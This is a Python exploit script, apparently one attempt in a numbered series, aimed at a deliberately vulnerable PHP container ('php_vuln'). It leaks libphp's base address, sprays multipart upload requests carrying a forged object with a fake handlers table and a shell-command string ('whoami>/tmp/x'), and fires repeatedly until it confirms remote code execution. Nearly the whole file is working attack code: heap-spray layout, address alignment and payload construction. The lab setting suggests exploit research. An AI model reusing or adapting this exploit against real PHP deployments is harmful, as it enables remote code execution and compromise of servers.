#!/usr/bin/env python3
"""oom101: nibble-8 law restored (the bug that silenced oom100).

100 evidence: fixed BOFF=384 gave OBJ=0x...17ea -> type nibble 0xa =
IS_REFERENCE -> walk followed the reference and skipped -> clean 200.
oom98f (the only live crash AT our OBJ) enforced (OBJ&0xF)==8 with
bit8 set -> slot type byte reads 0x08 | 0x100 = 0x108 = IS_OBJECT +
DESTRUCTOR_CALLED -> decrement path.

101 changes vs 100:
  - BOFF searched per boot: smallest >=352 with (V+BOFF)%16==8 and
    ((V+BOFF)>>8)&1==1  -> ti-analogue is always 0x108 (boot-proof)
  - pointer zone covers 0..BOFF (observed walk slots +8..+256)
  - keeps 100's field fixes: num_args@+0x2C, gs header <IIQQ>(1,0x106,0,13)
  - informational readback before firing (non-fatal if region died)
"""
import struct, subprocess, time, re, urllib.request, urllib.error

HOST = "http://127.0.0.1:8081"
OUT = lambda s: print(s, flush=True)

def sh(cmd, timeout=90):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout).stdout.strip()

def get(url, timeout=30):
    try:
        return urllib.request.urlopen(url, timeout=timeout).read().decode("utf8", "replace")
    except Exception as e:
        return "ERR %s" % e

def post(body, timeout=90):
    req = urllib.request.Request(HOST + "/oom_sapi.php", data=body)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return str(r.status), r.read(120)
    except urllib.error.HTTPError as e:
        return str(e.code), e.read(120)
    except Exception as e:
        return "ERR", repr(e).encode()

BASE = None
for ln in sh("docker exec php_vuln sh -c 'cat /proc/1/maps'").splitlines():
    if "libphp.so" in ln:
        BASE = int(ln.split("-")[0], 16)
        break
OUT("    libphp=0x%x" % BASE)
assert BASE and BASE > 0x7f0000000000

ZIF = 0x39b8a0
TILE = 176
MARKER = b"ZAIMZAIM" * 24

def gs_block():
    hdr = struct.pack("<IIQQ", 1, 0x106, 0, 13)   # rc, ti, h, len=13
    return hdr + b"whoami>/tmp/x\x00" + b"\x00" * ((-(24 + 14)) % 8)

def build_tile(OBJ, BOFF):
    B = bytearray(TILE)
    struct.pack_into("<II", B, 0x00, 1, 0x108)    # rc=1, ti=0x108
    struct.pack_into("<II", B, 0x08, 1, 0)        # handle=1, pad
    struct.pack_into("<Q",  B, 0x10, 0)           # ce
    struct.pack_into("<I",  B, 0x2C, 1)           # num_args=1
    B[0x18:0x20] = struct.pack("<Q", OBJ + 0x80)  # handlers -> table
    B[0x50:0x58] = struct.pack("<Q", OBJ + 0x68)  # arg value = gs
    B[0x58:0x5C] = struct.pack("<I", 6)           # arg type = IS_STRING
    G = gs_block()
    B[0x68:0x68 + len(G)] = G
    B[0x80:0x90] = struct.pack("<QQ", 0, BASE + ZIF)  # table[1] = free_obj
    T = bytearray(1537)
    for off in range(0, BOFF, 8):                 # every slot = OBJ (law)
        struct.pack_into("<Q", T, off, OBJ)
    T[BOFF:BOFF + TILE] = B
    MOFF = BOFF + TILE
    if MOFF + 192 <= 1537:
        T[MOFF:MOFF + 192] = MARKER
    return bytes(T)

def probe_small(needle):
    h = needle.hex()
    for a in range(6):
        out = get("%s?h=%s&chunk=262144&maxc=6" % (HOST + "/oom_probe.php", h), timeout=40)
        if out.startswith("ERR") or "Fatal" in out:
            time.sleep(0.5); continue
        m = re.search(r"R=(\d+) d=([0-9a-f ]+)", out)
        if m:
            offs = [int(x, 16) for x in m.group(2).split()]
            if offs:
                return offs
    return None

def aim_body(tile):
    parts = []
    parts.append(b"------X\r\nContent-Disposition: form-data; name=\"p0\"; filename=\"%s\"\r\n"
                 b"Content-Type: text/plain\r\n\r\n%s\r\n" % (b"a" * 1525, tile))
    for i in range(1, 3400):
        parts.append(b"------X\r\nContent-Disposition: form-data; name=\"p%d\"; filename=\"%s\"\r\n"
                     b"Content-Type: text/plain\r\n\r\n%s\r\n" % (i, b"a" * 1525, b"A" * 1537))
    parts.append(b"------X--\r\n")
    return b"".join(parts)

def check_x(tag):
    x = sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'")
    if "No such" not in x:
        OUT("    *** %s: /tmp/x EXISTS: %r" % (tag, x))
        return True
    return False

# ================= boot cycle =================
for i in range(50):
    post(aim_body((b"WARMUPX" * 192 + b"W" * 400)[:1537]))
offs = probe_small(b"WARMUPX" * 24)
OUT("    probe offs=%s" % (offs[:4] if offs else None))
assert offs, "no sentinel region"
V = offs[0]
OUT("    V=0x%x (mod16=%d)" % (V, V & 0xF))

# per-boot BOFF: nibble-8 + bit8 -> slot ti reads 0x108 in ANY boot
OBJ = None
for b in range(352, 900):          # any tile offset: bit laws pick the VA
    cand = V + b
    if (cand & 0xF) == 8 and ((cand >> 8) & 1) == 1:
        OBJ = cand; BOFF = b
        break
OUT("    OBJ=0x%x (BOFF=%d)" % (OBJ or 0, BOFF if OBJ else -1))
assert OBJ

tile = build_tile(OBJ, BOFF)
code, resp = post(aim_body(tile))     # the sacrifice IS the armed shot
OUT("    sacrifice: %s %r" % (code, resp[:50]))
if check_x("sacrifice"):
    raise SystemExit("*** RCE CONFIRMED (sacrifice) ***")

# informational readback (may be empty if shutdown released the tile)
rb = get("%s?read=%d&n=32" % (HOST + "/oom_probe.php", OBJ), timeout=30)
OUT("    readback @OBJ: %s" % (rb[:64] or "<empty>"))

for fi in range(4):
    code, resp = post(aim_body(tile))
    OUT("    fire%d: %s" % (fi, code))
    if check_x("fire%d" % fi):
        OUT("*** RCE CONFIRMED ***")
        break
    if code == "ERR":
        time.sleep(3)
OUT("done; /tmp/x=%s" % sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'"))
